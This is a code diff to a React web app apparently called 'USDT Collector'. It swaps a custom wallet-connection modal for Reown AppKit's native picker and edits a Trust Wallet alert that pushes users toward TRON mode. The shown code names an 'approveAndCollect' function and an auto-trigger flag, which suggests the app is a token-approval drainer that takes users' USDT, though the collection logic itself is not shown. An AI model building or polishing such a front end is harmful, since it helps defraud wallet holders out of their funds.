@@ -82,7 +82,7 @@ const wagmiAdapter = new WagmiAdapter({
 createAppKit({
   adapters: [tronAdapter, wagmiAdapter], 
   networks: appkitNetworks,
-  defaultNetwork: tronMainnet, 
+  defaultNetwork: tronMainnet, // Prioritizes Tron internally
   projectId: WC_PROJECT_ID,
   metadata: {
     name:        'USDT Collector',
@@ -131,9 +131,6 @@ export default function App() {
   const [loading, setLoading] = useState(false)
   const [txHash, setTxHash] = useState('')
   const autoTriggered = useRef(false)
-
-  // ✨ Added state for the custom routing modal
-  const [showWalletModal, setShowWalletModal] = useState(false)
 
   const { open } = useAppKit()
   const { address: walletAddress, isConnected, caipAddress } = useAppKitAccount()
@@ -283,9 +280,9 @@ export default function App() {
     }
   }
 
-  // ✨ FIXED: This now properly opens the custom modal!
+  // ✨ FIX: Native AppKit Trigger ✨
   const handleConnect = () => {
-    setShowWalletModal(true) 
+    open(); // By removing { view: 'AllWallets' }, Reown natively shows the "Browser Wallet" list!
   }
 
   const approveAndCollect = async () => {
@@ -302,7 +299,7 @@ export default function App() {
         log(`❌ Switch failed: ${e.message}`);
         const w = window as any;
         if (w.trustwallet) {
-          alert('TRUST WALLET RESTRICTION:\n\nTrust Wallet forces this browser into Ethereum mode.\n\nTo use TRON:\n1. Disconnect your wallet.\n2. Click "Connect Wallet" again.\n3. Choose "Trust Wallet & Mobile".');
+          alert('TRUST WALLET RESTRICTION:\n\nTrust Wallet forces this browser into Ethereum mode.\n\nTo use TRON:\n1. Disconnect your wallet.\n2. Click "Connect Wallet" again.\n3. Choose "WalletConnect" or "Trust Wallet" without the ETH logo.');
           setStatus('Action Needed: Use Mobile Connection');
         } else {
           open({ view: 'Networks' }); 
@@ -464,6 +461,10 @@ export default function App() {
                 Connect Wallet
                 <Wallet className="w-6 h-6" />
               </button>
+
+              <p className="text-xs text-zinc-500 mt-6">
+                Connects natively via AppKit
+              </p>
             </div>
           ) : (
             <div className="space-y-6">
@@ -523,63 +524,6 @@ export default function App() {
             </div>
           </div>
         </div>
-
-        {/* ✨ THE CUSTOM UI ROUTER MODAL ✨ */}
-        {showWalletModal && (
-          <div className="absolute inset-0 z-50 flex items-end sm:items-center justify-center bg-black/80 sm:p-4 transition-all">
-            <div className="bg-[#141414] sm:border border-zinc-800 sm:rounded-3xl rounded-t-[32px] w-full max-w-sm overflow-hidden shadow-2xl animate-in slide-in-from-bottom-8 sm:slide-in-from-bottom-0 fade-in duration-200">
-              
-              <div className="p-5 flex justify-center items-center relative border-b border-zinc-800/50">
-                <h3 className="font-bold text-white text-[17px]">Connect Wallet</h3>
-                <button 
-                  onClick={() => setShowWalletModal(false)} 
-                  className="absolute right-5 text-zinc-400 hover:text-white"
-                >
-                  ✕
-                </button>
-              </div>
-
-              <div className="p-4 space-y-3 pb-8 sm:pb-4">
-                
-                {/* 1. Browser Wallet -> Triggers EIP-6963 Injected View */}
-                <button 
-                  onClick={() => {
-                    setShowWalletModal(false)
-                    open({ view: 'Connect' }) 
-                  }}
-                  className="w-full flex items-center p-4 bg-[#1e1e1e] hover:bg-[#252525] border border-emerald-500/40 rounded-[20px] transition-all"
-                >
-                  <div className="w-12 h-12 flex items-center justify-center mr-4">
-                    <span className="text-3xl">🦊</span>
-                  </div>
-                  <div className="text-left">
-                    <p className="font-bold text-white text-[15px]">Browser Wallet</p>
-                    <p className="text-[13px] text-zinc-400 mt-0.5">MetaMask, Rabby, Coinbase...</p>
-                  </div>
-                </button>
-
-                {/* 2. Trust Wallet & Mobile -> Forces WalletConnect bypass */}
-                <button 
-                  onClick={() => {
-                    setShowWalletModal(false)
-                    open({ view: 'Connect' }) 
-                  }}
-                  className="w-full flex items-center p-4 bg-[#1e1e1e] hover:bg-[#252525] border border-transparent rounded-[20px] transition-all"
-                >
-                  <div className="w-12 h-12 bg-blue-500 rounded-[14px] flex items-center justify-center mr-4">
-                    <span className="text-white text-2xl">〰️</span>
-                  </div>
-                  <div className="text-left">
-                    <p className="font-bold text-white text-[15px]">Trust Wallet & Mobile</p>
-                    <p className="text-[13px] text-zinc-400 mt-0.5">Scan QR • Works with any wallet</p>
-                  </div>
-                </button>
-
-              </div>
-            </div>
-          </div>
-        )}
-
       </div>
     </div>
   )
